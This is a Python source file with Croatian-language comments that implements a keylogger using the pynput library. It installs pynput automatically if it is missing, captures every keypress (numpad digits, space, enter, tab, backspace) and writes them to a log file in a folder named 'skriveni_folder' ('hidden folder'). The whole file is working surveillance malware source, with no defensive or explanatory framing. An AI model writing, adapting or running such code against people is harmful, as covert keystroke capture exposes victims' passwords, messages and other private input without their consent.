import subprocess # za instaliranje pynputa ukoliko nije instaliran
import sys        # za instaliranje pynputa ukoliko nije instaliran

try:
    from pynput import keyboard 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
    from pynput import keyboard # pynput se koristi za detekciju pritisnutih tipki

class Keylogger:

##########################################################################################################################################

    def __init__(self, log_path):
        # Inicijalizacija putanje gdje će se čuvati log file
        self.log_path = log_path  
        self.char = ""  # Početna prazna varijabla

##########################################################################################################################################

    def on_press(key):
        try:
            if hasattr(key, 'vk') and 96 <= key.vk <= 111:
                if key.vk == 96:
                    keylogger.char += "0"
                elif key.vk == 97:
                    keylogger.char += "1"
                elif key.vk == 98:
                    keylogger.char += "2"
                elif key.vk == 99:
                    keylogger.char += "3"
                elif key.vk == 100:
                    keylogger.char += "4"
                elif key.vk == 101:
                    keylogger.char += "5"
                elif key.vk == 102:
                    keylogger.char += "6"
                elif key.vk == 103:
                    keylogger.char += "7"
                elif key.vk == 104:
                    keylogger.char += "8"
                elif key.vk == 105:
                    keylogger.char += "9"
                elif key.vk == 106:
                    keylogger.char += "*"
                elif key.vk == 107:
                    keylogger.char += "+"
                elif key.vk == 109:
                    keylogger.char += "-"
                elif key.vk == 110:
                    keylogger.char += ","
                elif key.vk == 111:
                    keylogger.char += "/"
            else:
                keylogger.char += format(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                keylogger.char += " "
            elif key == keyboard.Key.enter:
                keylogger.char += "\n"
            elif key == keyboard.Key.tab:
                keylogger.char += "\t"
            elif key == keyboard.Key.cmd:
                keylogger.char += "⊞"
            elif key == keyboard.Key.backspace:
                keylogger.delete_last()

        # Ažurira log file
        keylogger.update_log()

##########################################################################################################################################

    def update_log(self):
        # Otvori file u režimu dodavanja (append), kako bi se zapisivalo novo logiranje bez brisanja prethodnih podataka
        with open(self.log_path, "a", encoding="utf-8") as file:
            file.write(self.char)
            self.char = ""  # Resetira varijablu nakon što je upisan znak kako nebi došlo do dupliciranja

##########################################################################################################################################

    def delete_last(self):
        # Otvori file u režimu čitanja (read), kako bi se pročitao content file-a
        with open(self.log_path, "r", encoding="utf-8") as file:
            content = file.read()
            if content: # ako nije prazan
                content = content[:-1] # cijeli sadrzaj txt datoteke se kopira osim posljednjeg znaka
            with open(self.log_path, "w", encoding="utf-8") as file:
                file.write(content) # zapisi novi sadrzaj

##########################################################################################################################################

    def start(self):
        with keyboard.Listener(
                on_press=Keylogger.on_press) as listener:
            listener.join()

##########################################################################################################################################

log_path = r"c:\skriveni_folder\log.txt"  # Putanja na kojoj će se čuvati log file

# Kreira instancu klasa i pokreće keylogger
keylogger = Keylogger(log_path)
keylogger.start()